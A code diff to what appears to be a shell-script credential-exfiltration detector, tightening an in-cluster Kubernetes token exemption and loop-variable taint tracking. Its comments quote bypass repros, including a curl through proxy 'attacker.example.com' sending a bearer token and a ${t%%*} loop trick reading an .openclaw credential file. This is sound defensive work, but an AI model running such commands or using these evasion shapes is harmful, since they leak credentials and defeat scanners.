+    def _tls_excused(start: int, end: int) -> bool:
+        if not any(s <= start and end <= e for s, e in tls_material_spans):
+            return False
+        return not any(cs < end and start < ce for cs, ce in tls_material_cmdsub_spans)
+
+    for s0, e0 in operator_ref_spans:
+        if not _tls_excused(s0, e0):
+            return False
+
+    auth_header_spans = [
+        (t.value_start, t.value_end)
+        for t in tokens
+        if t.role == "AUTH_HEADER"
+        and t.value_start is not None
+        and _sh_auth_header_value_is_authorization(t.value_text)
+    ]
+
+    needs_auth_header_case = False
+    for m in matches:
+        if _tls_excused(m.start(), m.end()):
+            continue
+        is_incluster_token = (
+            bool(_INCLUSTER_TOKEN_PATH_RE.search(m.group(0)))
+            if all_incluster_token is None
+            else all_incluster_token
+        )
+        in_auth_header = any(s <= m.start() and m.end() <= e for s, e in auth_header_spans)
+        if is_incluster_token and in_auth_header:
+            needs_auth_header_case = True
+            continue
+        return False
+
+    if not needs_auth_header_case:
+        return True  # every match was TLS_MATERIAL-positioned -- position-only, done
+
+    if "HOP" in roles or "CONFIG" in roles or "UNKNOWN" in roles:
+        return False
+
+    for cmd in commands:
+        if cmd is curl_cmd:
+            continue
+        if _sh_command_text_is_outbound(raw, cmd.words):
+            return False
+
+    mirror_count = sum(1 for t in tokens if t.role == "MIRROR")
+    if mirror_count > 1:
+        return False
+    if mirror_count == 1 and len(commands) != 1:
+        return False
+
+    dest_tokens = [t for t in tokens if t.role == "DEST"]
+    if len(dest_tokens) != 1:
+        return False
+    dest = dest_tokens[0]
+    if dest.value_text is None:
+        return False
+    return _sh_incluster_dest_word_is_safe(dest.value_text, masked)
 
 
 # decode-then-exec: an encoded blob is decoded (base64/xxd/openssl) and piped straight
@@ -15150,9 +15522,16 @@ def _sh_staged_exec(masked: str) -> list[tuple[int, str]]:
 # INVARIANT (pinned by tests/test_b894_shell_loop_cred_taint.py): a
 # `for V in <literal words>; do BODY; done` loop is sugar for BODY repeated with V
 # replaced by each word. This engine adds ONLY what the UNCHANGED literal rules above
-# (`_SH_CRED_FILE_RE` / `_SH_CRED_ASSIGN_RE` / `_sh_cred_match_is_incluster_auth_only`)
-# would convict on that unrolled text, and is NEVER broader than them — every role below
-# uses exactly the literal rule's own vocabulary and exemption for that role. There is
+# (`_SH_CRED_FILE_RE` / `_SH_CRED_ASSIGN_RE`, and — since B-988 —
+# `_sh_line_incluster_exemption`, the SAME function the literal path itself calls, not
+# a loop-only copy) would convict on that unrolled text, and is NEVER broader than
+# them — every role below uses exactly the literal rule's own vocabulary and exemption
+# for that role. (Before B-988 this invariant was VIOLATED for the DIRECT role: it
+# called the older, enumeration-based `_sh_cred_match_is_incluster_auth_only` — which
+# has no concept of HOP/proxy flags at all — instead of the literal path's own B-986
+# argv-parsed `_sh_line_incluster_exemption`, so a loop body could win an exemption the
+# literal rule would have refused; see the B-988 note above `_sh_line_incluster_exemption`
+# for the exact repro.) There is
 # no independent taint model for V itself: no seeded dict, no fallback, no "which of two
 # states wins" question. V is covered structurally, by loop-body region, and nothing
 # else. A reviewer repro is therefore either an invariant violation (a bug here, fix
@@ -15329,47 +15708,35 @@ _SH_LOOP_PIPE_AFTER_DONE_RE = re.compile(r"[ \t]*\|(?!\|)(?P<pipe>[^\n;]*)")
 
 
 def _sh_loop_ref_re(name: str):
+    """A LOOSE reference pattern: matches a bare `$name`/`${name}` AND the
+    opening `${name` of any parameter-expansion operator form alike (it has
+    no concept of the operator syntax that may follow, or of where the
+    matching `}` actually is). B-986 round 5: this is now
+    DETECTION-only/legacy -- safe for a caller that only needs "does this
+    text reference `name` at all" (every remaining caller in this module is
+    exactly that: the DIRECT role's own per-line candidate scan, and
+    `_sh_incluster_dest_word_is_safe`'s single-reference substitution, which
+    is a LITERAL destination path with no operator syntax in scope for B-986
+    -- see decision 4/the R-4 follow-up). It must NEVER be used to SPLICE a
+    representative value in -- it does not know where an operator reference
+    actually ends, so blindly substituting at its match would glue a
+    representative word directly onto dangling operator syntax (the exact
+    round-5 bug `shellwords.param_refs` and the DIRECT role's splice loop in
+    `_sh_loop_cred_exfil_lines` exist to close -- see the round-5 history
+    block above that loop). Use `shellwords.param_refs` instead for any new
+    splice-shaped use."""
     return re.compile(r"\$\{?" + re.escape(name) + r"\b\}?")
 
 
-def _sh_loop_word_end(text: str, start: int) -> int:
-    """End offset of the shell word starting at *start* (an assignment's value):
-    quotes, `$(…)`, `${…}` and backticks nest; unquoted whitespace or a separator ends
-    it. Never crosses a newline, so a call is always bounded by its own line."""
-    stop = text.find("\n", start)
-    stop = len(text) if stop == -1 else stop
-    stack: list = []
-    i = start
-    while i < stop:
-        c = text[i]
-        top = stack[-1] if stack else ""
-        if c == "\\" and top != "'":
-            i += 2
-            continue
-        if top in ("'", "`", "{"):
-            if c == {"'": "'", "`": "`", "{": "}"}[top]:
-                stack.pop()
-        elif top == '"':
-            if c == '"':
-                stack.pop()
-            elif c == "`" or (c == "$" and text.startswith("(", i + 1)):
-                stack.append(c if c == "`" else "(")
-                i += c == "$"
-        elif c in "'\"`":
-            stack.append(c)
-        elif c == "$" and text.startswith(("(", "{"), i + 1):
-            stack.append(text[i + 1])
-            i += 1
-        elif c == "(":
-            stack.append("(")
-        elif c == ")":
-            if not stack:
-                return i
-            stack.pop()
-        elif not stack and c in " \t;&|<>":
-            return i
-        i += 1
-    return min(i, stop)
+# B-986 P2: moved to shellwords.py (the new real shell word/
+# command splitter curlargv.py's positional parsing is built on) -- kept
+# importable under this exact name here since this module's own loop-taint
+# code below is its one remaining direct caller, and tests/other code may
+# still import it as `clawseccheck.skillast._sh_loop_word_end`. Byte-for-byte
+# the same algorithm; see shellwords._word_scan_state's docstring for the
+# two additional fail-closed signals shellwords.scan_line derives from it
+# that this thin re-export does not expose.
+_sh_loop_word_end = _shellwords._sh_loop_word_end
 
 
 def _sh_loop_bound_names(m) -> list:
@@ -15604,9 +15971,15 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     to the loop unrolled onto its words (see the design note above this section):
 
       DIRECT — a `file_words` reference inside V's own body, on an outbound line,
-        substituted in and re-checked with the UNCHANGED `_SH_CRED_FILE_RE` /
-        `_sh_cred_match_is_incluster_auth_only` (so B-415's TLS/in-cluster exemption
-        applies identically to the loop form). Reported in `direct_or_pipe_lines`.
+        substituted in and re-checked with the UNCHANGED `_SH_CRED_FILE_RE`, then
+        (B-988) run through `_sh_line_incluster_exemption` -- the SAME
+        real positional-argv-parsed exemption engine B-986 built for the literal
+        path, not the old enumeration-based `_sh_cred_match_is_incluster_auth_only`
+        (retired: it had no concept of HOP/proxy flags at all, so `curl -x
+        attacker.example.com:8080 -H "Authorization: Bearer $(cat "$V")"
+        https://kubernetes.default.svc/...` inside a loop body was silently granted
+        the exemption -- see the B-988 note above `_sh_line_incluster_exemption`).
+        Reported in `direct_or_pipe_lines`.
       HOP — an in-body assignment `X=`/`X+=` whose value reads a `read_words`-seeded V
         (`$(cat "$V")` etc.); X then carries that taint at every later offset up to its
         next non-accumulating rebinding, checked the same nearest-prior-binding way
@@ -15626,7 +15999,7 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     this function's OWN `raw = masked[a:b]` line reconstruction below (used to build
     `sub` for the DIRECT role) would otherwise see the header's un-substituted word
     ALONGSIDE the correctly-substituted one on the exact same slice — the header word is
-    never in TLS-flag position, so `_sh_cred_match_is_incluster_auth_only` sees a second,
+    never in TLS-flag position, so `_sh_line_incluster_exemption` sees a second,
     non-exempt match and convicts a line the loop-unrolled substitution alone would
     correctly exempt. Blanking the header first makes the loop-unrolling substitution the
     SOLE source of truth for a loop-bound word reaching an outbound line, on one-line and
@@ -15742,6 +16115,101 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     # word the loop could substitute there. The position-only TLS-flag arm is
     # untouched and still uses the single representative word, since that arm's
     # verdict genuinely does not depend on which word fills the slot.
+    #
+    # B-988 (independent C-135 review of B-986, BLOCKER; see the module
+    # comment above `_sh_line_incluster_exemption` for the full repro): rounds 1-3
+    # above fixed this role's COST, never its SOUNDNESS -- they kept calling the old,
+    # enumeration-based `_sh_cred_match_is_incluster_auth_only` /
+    # `_sh_line_has_incluster_destination`, which has no concept of HOP-role/proxy
+    # flags at all (it pre-dates curlargv.py entirely), so `curl -x attacker... -H
+    # "Authorization: Bearer $(cat "$V")" https://kubernetes.default.svc/...` inside a
+    # loop body silently won the exemption -- the exact decision-1 bypass class B-986
+    # was built to close, just reached through this role instead of the literal path.
+    # Fix: call `_sh_line_incluster_exemption` (below) instead -- the real
+    # `shellwords`/`curlargv`-parsed engine the literal path already uses -- passing
+    # `region_all_incluster_token` through as its `all_incluster_token` parameter so
+    # the round-3 all-or-nothing invariant above still holds. `sub` (built just below,
+    # one representative word substituted into the raw physical line) is exactly the
+    # "one concrete parseable line" a real argv parser needs; a loop's ITERATION LIST
+    # varies, but the curl invocation line it produces per iteration does not, and
+    # `curlargv.py`/`shellwords.py` never need to resolve what the loop variable holds
+    # at runtime -- only which flags/roles are present, which the substituted text
+    # already reflects. `_sh_line_incluster_exemption` fails closed (refuses the
+    # exemption) on anything it cannot parse, and this role's own exemption
+    # DECISION is made by that one shared function, not a copy of its logic.
+    # CORRECTION (round 5): this paragraph originally went on to claim that
+    # sharing one function makes this role "no less conservative than the
+    # literal path, by construction." That was an overclaim, disproven by
+    # round 5 below: sharing the DECISION function does not make the two
+    # paths' INPUT to it equivalent -- the loop role's own pre-substitution
+    # step can still hand `_sh_line_incluster_exemption` misleading text
+    # (a certified token glued onto dangling operator syntax) that no
+    # literal invocation could ever produce, since the literal path never
+    # substitutes anything at all. See the round-5 history block above
+    # `_sh_loop_cred_exfil_lines` for the actual fix (P1-P3).
+    #
+    # B-986 round 4 (independent C-135 review of 32f39d52, the round-3
+    # fix above, BLOCKER): round 3 made `_sh_word_is_incluster_token` an EXACT
+    # predicate (a word counts as the token only when `_SH_CRED_FILE_RE`'s match
+    # spans the whole word) but left THIS call site folding that verdict into a
+    # BLANKET `all_incluster_token=True` override, applied to EVERY
+    # `_SH_CRED_FILE_RE` match `_sh_line_incluster_exemption` finds on the
+    # substituted line `sub` -- not just the match at the substituted `$var`
+    # position. A loop word that is genuinely, exactly the in-cluster token can
+    # still coexist on the SAME physical line with a DIFFERENT, unrelated
+    # credential-shaped match the shell will actually read at runtime, reached via
+    # a parameter-expansion operator this module's substitution never modeled AT
+    # THE TIME (round 4; it only recognized bare `$var`/`${var}`, via
+    # `_sh_loop_ref_re`'s loose `\$\{?name\b\}?`) -- CORRECTION: this is no
+    # longer true as of round 5 below, which replaced the splice with
+    # `shellwords.param_refs`, a real bare-vs-operator classifier; read this
+    # paragraph as history, not current behavior. Repro (`analyze_shell`
+    # returned `[]` before the round-4 fix):
+    #
+    #   for t in /var/run/secrets/kubernetes.io/serviceaccount/token; do
+    #     curl -H "Authorization: Bearer $(cat "$HOME/.openclaw${t%%*}/openclaw.json")" \
+    #       https://kubernetes.default.svc/api/v1/namespaces
+    #   done
+    #
+    # `${t%%*}` strips the loop variable to empty at real shell-expansion time, so
+    # the file actually read is `~/.openclaw/openclaw.json` (a credential store --
+    # `\.openclaw/` in `_SH_CRED_FILE_RE` -- potentially holding API keys), never
+    # the token itself -- but `_sh_loop_ref_re` still matches the leading `${t` and
+    # glues `rep_word` (the pure token) in right there, and the blanket
+    # `all_incluster_token=True` then certifies EVERY match `_sh_line_incluster_
+    # exemption` finds on that garbled substituted line, including the
+    # `.openclaw/` one, as if it were the token -- laundering a real credential
+    # read past this crit rule. The unrolled literal form of the same substituted
+    # text was never affected (verified by execution): it always calls
+    # `_sh_line_incluster_exemption` with `all_incluster_token=None`, which
+    # computes `is_incluster_token` fresh per match
+    # (`_INCLUSTER_TOKEN_PATH_RE.search(m.group(0))`) and already refuses the
+    # `.openclaw/` match on its own lack of token content.
+    #
+    # Fix: never pass `True` again. When `region_all_incluster_token` is True
+    # (every loop word is genuinely, exactly the token -- round 3's predicate,
+    # still needed, see below), defer to `_sh_line_incluster_exemption`'s own
+    # per-match check by passing `None` instead -- this closes the round-4
+    # repro above (verified by execution), but CORRECTION (round 5): it does
+    # NOT, on its own, "correctly distinguish the certified token's own match
+    # from any OTHER credential-shaped match reached through the same
+    # substituted line" in general, as this paragraph originally claimed --
+    # the per-match check's own content test is a substring `.search()`, not
+    # whole-match identity, so an operator reference glued directly onto the
+    # certified token can still read as clean to it (round 5's actual bug;
+    # closed by the `operator_ref_spans` refusal, not by this `None`/`False`
+    # split, which only ever addressed the BLANKET-override shape). When
+    # `region_all_incluster_token` is False, keep passing `False` (blanket deny)
+    # unchanged -- this is round 3's OWN protection (the mixed-word-list case: a
+    # real credential word padding the loop's word list alongside the harmless
+    # token) and does NOT collapse into always-None: verified by execution that
+    # always passing `None` (dropping `region_all_incluster_token`/
+    # `_sh_word_is_incluster_token` entirely) REOPENS round 3's bug, because
+    # `rep_word = min(file_words)` sorts the token first (`/var/... < ~/...`) and a
+    # per-match check on only that one representative substitution cannot see that
+    # the loop ALSO iterates the real credential on another word -- so both
+    # functions stay in place. `all_incluster_token` may now only ever be `None`
+    # or `False` from this call site, never `True`.
     for var, file_words, _read_words, bs, cut, _be, _hs, _he in regions:
         if not file_words:
             continue
@@ -15760,18 +16228,68 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
             raw = header_blanked[a:b]
             if not outbound(raw):
                 continue
-            spans = [
-                (x.start() - a, x.end() - a) for x in ref.finditer(text, max(a, bs), min(b, cut))
-            ]
-            pieces, last = [], 0
-            for s0, e0 in spans:
-                pieces.append(raw[last:s0])
-                pieces.append(rep_word)
+            # B-986 round 5 (P2): `param_refs`, not `ref.finditer`, decides what
+            # gets spliced -- see the module comment above `param_refs` in
+            # shellwords.py and the round-5 history block above this loop. A
+            # BARE reference (`$var`/`${var}`) still gets `rep_word` spliced in,
+            # exactly as before; an OPERATOR reference (`${var%%x}`, `${var:-}`,
+            # ...) is copied through UNCHANGED instead of being partially
+            # overwritten -- splicing only the `${var` prefix and leaving the
+            # operator's own syntax dangling as literal text is exactly the
+            # round-5 bug (a certified token glued directly onto operator
+            # garbage still reads as the clean token to `_SH_CRED_FILE_RE`'s own
+            # fixed-text alternative). Each operator span's own position in the
+            # FINAL `sub` string is recorded (`operator_spans`, tracked via a
+            # running `cursor` so this stays one pass over `refs` -- no
+            # per-span `sum(len(...))` recomputation, which would reopen the
+            # exact O(hits * line length) blowup `_sh_loop_cred_exfil_lines`'s
+            # own B-894 round-1/round-2 history above already fixed once) --
+            # `_sh_line_incluster_exemption` needs these to refuse the
+            # exemption on any operator reference it cannot prove sits entirely
+            # inside a TLS-material value (P3 below).
+            refs = _shellwords.param_refs(text, var, max(a, bs), min(b, cut))
+            pieces, operator_spans, last, cursor = [], [], 0, 0
+            for pr in refs:
+                s0, e0 = pr.start - a, pr.end - a
+                # A NESTED reference to the same name inside an already-
+                # emitted operator span's own body (`${t:-${t:-x}}`, or a
+                # self-referential operator like `${t/$t/x}`) is skipped, not
+                # reprocessed: the OUTER operator span already gets copied
+                # through verbatim (including this inner text), so splicing
+                # or re-recording it a second time would both double-count it
+                # in `operator_spans` AND, since `param_refs` on an
+                # adversarially deep nest yields one ever-larger overlapping
+                # span per nesting level, blow the O(refs) cost up to
+                # O(refs^2) in the length of `sub` itself -- see this file's
+                # perf-guard tests in tests/test_b894_shell_loop_cred_taint.py.
+                if s0 < last:
+                    continue
+                prefix = raw[last:s0]
+                pieces.append(prefix)
+                cursor += len(prefix)
+                if pr.bare:
+                    pieces.append(rep_word)
+                    cursor += len(rep_word)
+                else:
+                    seg = raw[s0:e0]
+                    pieces.append(seg)
+                    operator_spans.append((cursor, cursor + len(seg)))
+                    cursor += len(seg)
                 last = e0
             pieces.append(raw[last:])
             sub = "".join(pieces)
-            if _SH_CRED_FILE_RE.search(sub) and not _sh_cred_match_is_incluster_auth_only(
-                sub, masked, all_incluster_token=region_all_incluster_token
+            operator_spans = tuple(operator_spans)
+            # B-986 round 4: never pass `True` here (see the block comment above
+            # this loop) -- `None` defers to the per-match content check when every
+            # loop word is genuinely the token, `False` keeps the blanket deny when
+            # it is not.
+            if (
+                operator_spans or _SH_CRED_FILE_RE.search(sub)
+            ) and not _sh_line_incluster_exemption(
+                sub,
+                masked,
+                all_incluster_token=(None if region_all_incluster_token else False),
+                operator_ref_spans=operator_spans,
             ):
                 direct_hits.add(line_of(rm.start()))
 
@@ -15803,7 +16321,20 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
                 if not read_words or not (bs <= bstart < cut):
                     continue
                 for sm in _SH_LOOP_SUBST_READ_RE.finditer(val):
-                    if _sh_loop_ref_re(var).search(sm.group("args")):
+                    # B-986 round 5 (P4): `param_refs`, not the loose
+                    # `_sh_loop_ref_re`, decides whether this reads `var` --
+                    # accepts BOTH a bare AND an operator reference as "this
+                    # word references the tainted variable" (never bare-only:
+                    # G-1's own regression control -- an operator reference
+                    # still seeds HOP taint -- proves narrowing to bare-only
+                    # here would silently reopen a false negative). Verdict-
+                    # neutral vs. the old `.search()`: HOP/PIPE never spliced
+                    # a representative word in the first place, so there is no
+                    # substitution-defeating-a-negative-lookahead bypass class
+                    # to close here -- this is purely a detection-precision
+                    # swap, not a new exemption/refusal.
+                    args = sm.group("args")
+                    if _shellwords.param_refs(args, var, 0, len(args)):
                         hop |= read_words
         if hop:
             hop_names.add(name)
@@ -15817,7 +16348,10 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
             if op == "clear":
                 cur = frozenset()
             else:
-                keep = op == "+=" or bool(_sh_loop_ref_re(name).search(val))
+                # P4: same param_refs swap as the seed check above -- bare
+                # OR operator both count as "this rebinding still references
+                # itself" (G-3's own regression control).
+                keep = op == "+=" or bool(_shellwords.param_refs(val, name, 0, len(val)))
                 cur = frozenset(hop | (cur if keep else frozenset()))
             offs.append(off)
             taints.append(cur)
@@ -15828,8 +16362,11 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
             i = masked.count("\n", 0, pos) + 1
             if outbound(raw):
                 for name, (offs, taints) in state_hist.items():
-                    for rm in _sh_loop_ref_re(name).finditer(text, pos, pos + len(raw)):
-                        k = bisect.bisect_right(offs, rm.start())
+                    # P4: same param_refs swap -- G-2's own regression
+                    # control (an operator-referenced sink) proves this must
+                    # keep matching an operator reference, not just a bare one.
+                    for pr in _shellwords.param_refs(text, name, pos, pos + len(raw)):
+                        k = bisect.bisect_right(offs, pr.start)
                         if k and taints[k - 1]:
                             hop_hits.add(i)
             pos += len(raw) + 1
@@ -15838,11 +16375,13 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     for var, _fw, read_words, bs, cut, be, _hs, _he in regions:
         if not read_words:
             continue
-        ref = _sh_loop_ref_re(var)
         streams = False
         for sm in _SH_LOOP_STDOUT_READ_RE.finditer(kw, bs, cut):
             a0, a1 = sm.start("args"), sm.end("args")
-            if ref.search(text[a0:a1]) and ">" not in kw[a0:a1]:
+            # P4: same param_refs swap -- G-4's own regression control (an
+            # operator-referenced PIPE read) proves this must keep matching
+            # an operator reference, not just a bare one.
+            if _shellwords.param_refs(text, var, a0, a1) and ">" not in kw[a0:a1]:
                 streams = True
                 break
         if not streams:
@@ -16579,12 +17118,12 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
     # somewhere in the surrounding lines — no C-135 FP shape was found from it (see the
     # corpus/fleet compare in the commit).
     #
-    # Both the literal-path branch AND the B-415 in-cluster-auth exemption
-    # (`_sh_cred_match_is_incluster_auth_only` / `_sh_line_has_incluster_destination`)
-    # run against this SAME joined line, so a destination or Authorization header
-    # sitting on a continuation line is visible to the exemption exactly as it is to
-    # the sink check itself — giving the two branches an inconsistent view of the same
-    # command is the exact shape B-911's fall-through comment already guards against.
+    # Both the literal-path branch AND the B-415/B-986 in-cluster-auth exemption
+    # (`_sh_line_incluster_exemption`) run against this SAME joined line, so a
+    # destination or Authorization header sitting on a continuation line is visible
+    # to the exemption exactly as it is to the sink check itself — giving the two
+    # branches an inconsistent view of the same command is the exact shape B-911's
+    # fall-through comment already guards against.
     loop_direct_lines, loop_hop_lines, header_blanked = _sh_loop_cred_exfil_lines(source, masked)
     joined = _sh_loop_join_continuations(header_blanked)
     pos = 0
@@ -16596,10 +17135,16 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
         if not (_SH_OUTBOUND_RE.search(raw) or _sh_bare_nc_invocation(raw)):
             continue
         if _SH_CRED_FILE_RE.search(raw):
-            # B-415: curl's own TLS-material flags, and the narrow in-cluster
-            # token in an Authorization header aimed at the cluster's own API
-            # server, are legitimate in-cluster auth -- not exfiltration.
-            if not _sh_cred_match_is_incluster_auth_only(raw, masked):
+            # B-415/B-986: curl's own TLS-material-role flags, and the narrow
+            # in-cluster token in an Authorization header aimed at the
+            # cluster's own API server over a real, unproxied https://
+            # connection, are legitimate in-cluster auth -- not exfiltration.
+            # `_sh_line_incluster_exemption` is the real-positional-argv-
+            # parsed exemption engine -- see its own module comment for
+            # exactly what it covers and why. Since B-988, the
+            # loop-substituted-word DIRECT role below (`_sh_loop_cred_exfil_lines`)
+            # calls this SAME function too, not a separate copy.
+            if not _sh_line_incluster_exemption(raw, masked):
                 add(
                     "SHELL_CRED_EXFIL",
                     "crit",
